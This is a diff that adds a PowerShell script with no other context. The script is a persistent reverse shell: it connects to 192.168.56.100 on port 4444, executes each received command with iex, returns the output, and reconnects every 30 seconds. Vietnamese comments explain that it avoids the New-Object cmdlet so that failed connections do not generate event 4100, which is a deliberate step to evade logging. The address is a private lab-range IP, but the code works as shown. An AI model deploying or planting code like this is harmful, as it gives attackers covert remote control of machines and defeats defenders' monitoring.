@@ -1,0 +1,32 @@
+while ($true) {
+    $client = $null
+    try {
+        # Dung .NET constructor truc tiep (KHONG qua New-Object cmdlet)
+        # => khong sinh event 4100 khi connect fail
+        $client = [System.Net.Sockets.TcpClient]::new('192.168.56.100', 4444)
+    } catch {
+        Start-Sleep -Seconds 30
+        continue
+    }
+
+    try {
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
+
+        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+            $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
+            try {
+                $sendback = (iex $data 2>&1 | Out-String)
+            } catch {
+                $sendback = "[!] $($_.Exception.Message)"
+            }
+            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte, 0, $sendbyte.Length)
+            $stream.Flush()
+        }
+        $client.Close()
+    } catch {
+        Start-Sleep -Seconds 30
+    }
+}
